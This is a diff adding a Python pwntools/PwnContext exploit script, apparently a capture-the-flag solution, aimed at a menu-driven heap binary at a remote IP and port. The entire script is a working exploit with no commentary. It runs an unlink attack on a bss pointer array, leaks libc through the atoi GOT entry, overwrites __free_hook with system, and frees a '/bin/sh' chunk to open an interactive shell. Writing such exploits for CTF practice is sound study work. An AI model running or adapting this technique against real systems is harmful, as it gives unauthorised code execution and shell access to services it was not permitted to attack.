@@ -1,0 +1,60 @@
+from PwnContext import *
+context(os='linux',arch='amd64',log_level='debug')
+ctx.binary='./pwn'
+ctx.remote=('172.29.14.112',9999)
+binary=ctx.binary
+ctx.local_libc='./libc-2.23.so'
+libc=ELF('./libc-2.23.so')
+ctx.debug_remote_libc=False
+ctx.start('remote')
+#ctx.start()
+bss=0x00000000006021E0
+
+free_hook=0x00007F89E0A007A8-0x00007F89E063A000
+
+def add(index,size,content):
+    ctx.sendline('1')
+    ctx.recvuntil('index:\n')
+    ctx.sendline(str(index))
+    ctx.recvuntil('size:\n')
+    ctx.sendline(str(size))
+    ctx.recvuntil('content:\n')
+    ctx.send(content)
+
+def delete(index):
+    ctx.sendline('2')
+    ctx.recvuntil('index:\n')
+    ctx.sendline(str(index))
+    
+def edit(index,content):
+    ctx.sendline('3')
+    ctx.recvuntil('index:\n')
+    ctx.sendline(str(index))
+    ctx.recvuntil('content:\n')
+    ctx.send(content)
+
+def show(index):
+    ctx.sendline('4')
+    ctx.recvuntil('index:\n')
+    ctx.sendline(str(index))
+def main():
+    add(10,128,'/bin/sh\x00\n')
+    add(32,0xf8,'a')
+    add(31,0xf0,'a')
+    add(30,0x100,'a')
+    edit(32,p64(0x0)+p64(0x81)+p64(bss-0x18)+p64(bss-0x10)+p64(0x0)*12+p64(0x80)+p64(0x0)+p64(0x0)*12+p64(0xf0))
+    delete(31) # unlink to write bss
+    edit(32,p64(0x0)+p64(binary.got['atoi'])+p64(0x0)+p64(0x6021c8)+p64(0x0)+25*p64(0x0)+p32(0x1)+p32(0x9))
+    show(30)
+    libc_base=u64((ctx.recvuntil('1.'))[:-3]+'\x00\x00')-libc.symbols['atoi']
+    print "libc_base -> "+hex(libc_base)
+    system=libc_base+libc.symbols['system']
+    __free_hook=libc_base+free_hook
+    edit(32,p64(0x0)+p64(__free_hook)+p64(0x0)+p64(0x6021c8)+p64(0x0)+25*p64(0x0)+p32(0x1)+p32(0x9))
+    edit(30,p64(system))
+    delete(10)
+    ctx.interactive()
+    
+
+
+main()
